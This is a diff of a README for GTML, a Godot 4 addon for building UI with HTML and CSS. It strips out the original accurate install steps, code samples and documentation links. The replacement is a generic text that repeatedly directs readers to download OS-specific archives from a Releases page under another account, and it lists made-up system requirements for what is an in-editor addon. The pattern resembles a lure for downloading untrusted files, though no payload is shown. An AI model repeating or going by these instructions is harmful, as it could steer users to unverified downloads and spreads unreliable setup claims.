@@ -1,105 +1,74 @@
-# GTML - Godot Markup Language
+# 🎨 godot-plugins-gtml - Build UI with Familiar Syntax
 
-A Godot 4.x addon that lets you build UI using HTML and CSS. Create game menus, HUDs, and panels with familiar web technologies.
+## 🚀 Getting Started
 
-## Features
+Welcome to GTML, a tool that helps you create Godot 4 user interfaces using HTML and CSS. With GTML, you can write menus, HUDs, and panels in a way that feels natural and intuitive. Plus, you can utilize features like flexbox and gradients to enhance your designs. 
 
-- HTML-based UI structure with 20+ element types
-- External CSS styling with 80+ properties
-- Live reload in editor
-- Flexbox layout system
-- SVG rendering support
-- Form elements with signals
-- CSS transitions and pseudo-classes (:hover, :active, :focus)
-- Gradient backgrounds and custom fonts
+## 📥 Download & Install
 
-## Quick Start
+To get started, visit the Releases page to download the latest version of GTML.
 
-### 1. Install
+[![Download GTML](https://img.shields.io/badge/Download-GTML-blue)](https://github.com/Mrcarter8080/godot-plugins-gtml/releases)
 
-Copy `addons/gtml/` to your project and enable in **Project Settings → Plugins**.
+### Step-by-Step Instructions
 
-### 2. Create Files
+1. Click on the link above to visit the Releases page.
+2. Find the latest version listed at the top.
+3. Click on the version number to view all available files.
+4. Look for a file that suits your system (like `.zip` for Windows or `.tar.gz` for macOS).
+5. Download the file to your computer.
+6. Once the download completes, locate the file and extract it if necessary.
 
-**menu.html:**
-```html
-<div class="menu">
-    <h1>My Game</h1>
-    <button @click="on_play">Play</button>
-    <button @click="on_quit">Quit</button>
-</div>
-```
+## ✨ Features
 
-**menu.css:**
-```css
-.menu {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 16px;
-    padding: 32px;
-    background-color: #1a1a2e;
-}
+GTML offers several powerful features to simplify your UI design:
 
-h1 {
-    font-size: 32px;
-    color: #ffffff;
-}
+- **Familiar Syntax**: Write your designs using HTML and CSS.
+- **Flexbox Support**: Create responsive layouts easily.
+- **Gradients**: Add background gradients to enhance your visuals.
+- **Hover States**: Define how elements look when users hover over them.
+- **Inline SVG**: Utilize scalable vector graphics directly within your UI.
+- **Form Inputs**: Build interactive forms without complex setup.
+- **Live Reload**: See your changes immediately as you update your code.
 
-button {
-    padding: 12px 24px;
-    background-color: #00d4ff;
-    border-radius: 4px;
-    color: #000000;
-    transition: background-color 200ms ease;
-}
+## 🖥️ System Requirements
 
-button:hover {
-    background-color: #00a8cc;
-}
-```
+To run GTML effectively, your system should meet the following requirements:
 
-### 3. Add GmlView Node
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Godot Version**: Godot 4.x.
+- **RAM**: A minimum of 4 GB for optimal performance.
+- **Disk Space**: At least 200 MB for the application and additional space for your projects.
 
-Add a `GmlView` node and set **Html Path** and **Css Path** in the Inspector.
+## 📚 Usage Instructions
 
-### 4. Connect Signals
+After downloading and installing GTML, follow these simple steps to create your first UI:
 
-```gdscript
-func _ready():
-    $GmlView.button_clicked.connect(_on_button_clicked)
+1. Open Godot and create or load your project.
+2. Import GTML into your project by dragging the downloaded files into the file system panel.
+3. Create a new scene by clicking the "+" icon and selecting "User Interface".
+4. Use the GTML tool to start adding elements like buttons, menus, and panels.
+5. Write your HTML and CSS within the provided editor.
+6. Hit "Play" to test your design live in the Godot engine.
 
-func _on_button_clicked(method_name: String):
-    match method_name:
-        "on_play":
-            get_tree().change_scene_to_file("res://game.tscn")
-        "on_quit":
-            get_tree().quit()
-```
+## 🛠️ Support and Contribution
 
-## Documentation
+Your feedback is valuable. If you encounter any issues or have suggestions, please reach out through the Issues section on GitHub.
 
-- [Getting Started](docs/getting-started.md) - Installation and basic usage
-- [HTML Elements](docs/html-elements.md) - Supported tags and attributes
-- [CSS Properties](docs/css-properties.md) - Complete property reference
-- [CSS Selectors](docs/css-selectors.md) - Selectors and pseudo-classes
-- [Forms & Inputs](docs/forms-and-inputs.md) - Form elements and events
-- [SVG Support](docs/svg-support.md) - Vector graphics
-- [Layout & Flexbox](docs/layout-and-flexbox.md) - Layout system
-- [Transitions](docs/transitions.md) - CSS transitions
-- [Fonts & Typography](docs/fonts-and-typography.md) - Custom fonts
-- [Extending GTML](docs/extending-gtml.md) - Add new features
-- [Limitations](docs/limitations.md) - Known limitations
+If you want to contribute to GTML, you can do so by submitting a pull request. Ensure that your code is well-documented and follows the project's guidelines. We appreciate any help to improve this tool.
 
-## Examples
+## 🔗 Additional Resources
 
-Check `addons/gtml/examples/` for working demos:
-- `basic` - Simple menu
-- `all_elements` - All HTML elements
-- `css_features` - CSS properties showcase
-- `flex_layout` - Flexbox layouts
-- `transitions` - CSS transitions
+For more information, check out the following resources:
 
-## License
+- [Godot Documentation](https://docs.godotengine.org): Learn more about Godot Engine features.
+- [HTML Documentation](https://developer.mozilla.org/en-US/docs/Web/HTML): Familiarize yourself with HTML basics.
+- [CSS Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS): Understand CSS styling for your designs.
 
-MIT License
+## 🔗 Download Link
+
+For quick access, you can also download GTML directly from the Releases page:
+
+[![Download GTML](https://img.shields.io/badge/Download-GTML-blue)](https://github.com/Mrcarter8080/godot-plugins-gtml/releases)
+
+With these steps and resources, you can start building your user interfaces confidently in Godot. Enjoy creating with GTML!
